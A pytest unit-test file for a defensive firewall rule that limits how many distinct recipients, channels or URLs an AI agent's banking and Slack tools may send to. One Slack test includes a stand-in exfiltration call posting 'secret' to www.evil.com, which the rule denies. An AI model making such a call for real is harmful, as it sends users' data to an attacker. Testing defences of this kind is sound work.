"""Unit tests for R2 (DistinctDestinationLimit in mcpfw/policy.py).
Pure Python: no proxy, no server, no LLM.

Run from ~/fyp:  pytest tests/test_policy_r2_unit.py -v
"""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "mcpfw"))
from policy import (OTHER, SINK, DistinctDestinationLimit,  # noqa: E402
                    StaleDecisionError, TaintThenDeny)

# Destination argument of every egress tool (from the AgentDojo v1.2.2 tool schemas)
BANK_DEST = {"send_money": "recipient", "schedule_transaction": "recipient",
             "update_scheduled_transaction": "recipient"}
BANK_OPTIONAL = {"update_scheduled_transaction"}      # its `recipient` is not required
SLACK_DEST = {"send_direct_message": "recipient", "send_channel_message": "channel",
              "post_webpage": "url", "get_webpage": "url"}


def r2(k=2):
    return DistinctDestinationLimit("R2", BANK_DEST, k, BANK_OPTIONAL)


def step(rule, tool, args):
    """One call the way the proxy will do it: decide, forward if allowed, commit."""
    d = rule.decide(tool, args)
    if d.allow:
        rule.commit(d)
    return d


def pay(to):
    return {"recipient": to, "amount": 10, "subject": "x", "date": "2022-01-01"}


# ---------- the A, A, B, C example from the defense slides ----------
def test_slide_example_k2():
    rule = r2(k=2)
    ds = [step(rule, "send_money", pay(x)) for x in "AABC"]
    assert [d.allow for d in ds] == [True, True, True, False]
    assert [d.state_before for d in ds] == ["COUNT_0", "COUNT_1", "COUNT_1", "COUNT_2"]
    assert [d.state_after for d in ds] == ["COUNT_1", "COUNT_1", "COUNT_2", "COUNT_2"]
    assert rule.destinations == ["a", "b"]
    assert "R2" in ds[3].reason and "`c`" in ds[3].reason


def test_k1():
    rule = r2(k=1)
    assert [step(rule, "send_money", pay(x)).allow for x in "AAB"] == [True, True, False]


def test_old_destination_still_allowed_after_limit():
    rule = r2(k=2)
    for x in "ABC":
        step(rule, "send_money", pay(x))
    assert step(rule, "send_money", pay("A")).allow
    assert step(rule, "send_money", pay("B")).allow


# ---------- normalisation ----------
def test_case_and_spacing_are_one_destination():
    rule = r2(k=1)
    assert [step(rule, "send_money", pay(x)).allow
            for x in ["Alice", " alice ", "ALICE", "alice\n"]] == [True] * 4
    assert rule.destinations == ["alice"]


def test_different_tools_share_slots():
    rule = r2(k=1)
    assert step(rule, "send_money", pay("IBAN1")).allow
    assert step(rule, "schedule_transaction", {**pay("iban1"), "recurring": False}).allow
    assert not step(rule, "schedule_transaction", {**pay("IBAN2"), "recurring": False}).allow


# ---------- tools R2 does not cover ----------
def test_non_egress_tool_ignored():
    rule = r2(k=1)
    d = step(rule, "get_balance", {})
    assert d.allow and d.tool_class == OTHER and d.destination is None
    assert rule.state == "COUNT_0" and rule.version == 1
    d = step(rule, "get_balance", None)         # args are not even looked at
    assert d.allow


# ---------- missing / malformed destinations ----------
def test_missing_optional_destination_allowed_not_counted():
    rule = r2(k=1)
    d = step(rule, "update_scheduled_transaction", {"id": 7, "amount": 5})
    assert d.allow and d.tool_class == SINK and d.destination is None
    assert rule.destinations == []


def test_missing_required_destination_denied():
    rule = r2(k=2)
    d = rule.decide("send_money", {"amount": 10})
    assert not d.allow and "`recipient` is missing" in d.reason


@pytest.mark.parametrize("bad", [None, 123, 1.5, True, "", "   ", ["A"], {"x": 1}])
def test_malformed_destination_denied(bad):
    rule = r2(k=2)
    d = rule.decide("send_money", pay(bad))
    assert not d.allow and "cannot be checked" in d.reason
    assert d.state_after == d.state_before == "COUNT_0"


@pytest.mark.parametrize("args", [None, [], "recipient=A", 5])
def test_args_not_a_dict_denied(args):
    rule = r2(k=2)
    assert not rule.decide("send_money", args).allow


def test_malformed_optional_destination_still_denied():
    """Optional means it may be ABSENT, not that a present bad value is fine."""
    rule = r2(k=2)
    assert not rule.decide("update_scheduled_transaction", {"id": 1, "recipient": None}).allow


# ---------- only forwarded calls use a slot ----------
def test_denied_call_uses_no_slot():
    rule = r2(k=1)
    step(rule, "send_money", pay("A"))
    d = step(rule, "send_money", pay("B"))
    assert not d.allow
    with pytest.raises(ValueError):
        rule.commit(d)
    assert rule.destinations == ["a"]
    assert step(rule, "send_money", pay("A")).allow


def test_decided_but_not_forwarded_uses_no_slot():
    rule = r2(k=1)
    rule.decide("send_money", pay("A"))          # proxy dropped it: never committed
    assert step(rule, "send_money", pay("B")).allow
    assert rule.destinations == ["b"]


# ---------- commit safety (same as R1) ----------
def test_stale_decision_rejected():
    """Without this, two calls decided at COUNT_0 could both pass with K=1."""
    rule = r2(k=1)
    d1 = rule.decide("send_money", pay("A"))
    d2 = rule.decide("send_money", pay("B"))
    rule.commit(d1)
    with pytest.raises(StaleDecisionError):
        rule.commit(d2)
    assert rule.destinations == ["a"]


def test_commit_rejects_foreign_or_bad_input():
    a, b = r2(), r2()
    with pytest.raises(ValueError):
        a.commit(b.decide("send_money", pay("A")))
    r1 = TaintThenDeny("R1", {"read_file"}, {"send_money"})
    with pytest.raises(ValueError):
        a.commit(r1.decide("send_money"))
    with pytest.raises(TypeError):
        a.commit("send_money")


# ---------- construction ----------
@pytest.mark.parametrize("k", [0, -1, True, False, 1.5, "2", None])
def test_bad_k_rejected(k):
    with pytest.raises(ValueError):
        DistinctDestinationLimit("R2", BANK_DEST, k)


@pytest.mark.parametrize("dest_args", [{}, None, "send_money", [("send_money", "recipient")]])
def test_bad_dest_args_rejected(dest_args):
    with pytest.raises(ValueError):
        DistinctDestinationLimit("R2", dest_args, 2)


@pytest.mark.parametrize("dest_args", [{"send_money": ""}, {"": "recipient"}, {"send_money": 3}])
def test_bad_dest_args_entries_rejected(dest_args):
    with pytest.raises(TypeError):
        DistinctDestinationLimit("R2", dest_args, 2)


def test_bad_optional_rejected():
    with pytest.raises(ValueError):
        DistinctDestinationLimit("R2", BANK_DEST, 2, {"get_balance"})
    with pytest.raises(TypeError):
        DistinctDestinationLimit("R2", BANK_DEST, 2, "update_scheduled_transaction")


def test_bad_rule_id_rejected():
    with pytest.raises(ValueError):
        DistinctDestinationLimit("", BANK_DEST, 2)


def test_dest_args_copied():
    """Changing the caller's dict later must not change the rule."""
    d = dict(BANK_DEST)
    rule = DistinctDestinationLimit("R2", d, 1)
    d["get_balance"] = "x"
    assert rule.classify("get_balance") == OTHER


# ---------- Slack: different argument per tool ----------
def test_slack_destinations():
    rule = DistinctDestinationLimit("R2", SLACK_DEST, 2)
    assert step(rule, "send_channel_message", {"channel": "general", "body": "hi"}).allow
    assert step(rule, "send_direct_message", {"recipient": "Alice", "body": "hi"}).allow
    d = step(rule, "post_webpage", {"url": "www.evil.com", "content": "secret"})
    assert not d.allow and d.destination == "www.evil.com"


# ---------- determinism and logging ----------
def test_reason_is_deterministic():
    def deny_text():
        rule = r2(k=1)
        step(rule, "send_money", pay("A"))
        return rule.decide("send_money", pay("B")).reason
    assert deny_text() == deny_text()


def test_snapshot():
    rule = r2(k=2)
    step(rule, "send_money", pay("A"))
    assert rule.snapshot() == {"state": "COUNT_1", "version": 1, "k": 2, "destinations": ["a"]}
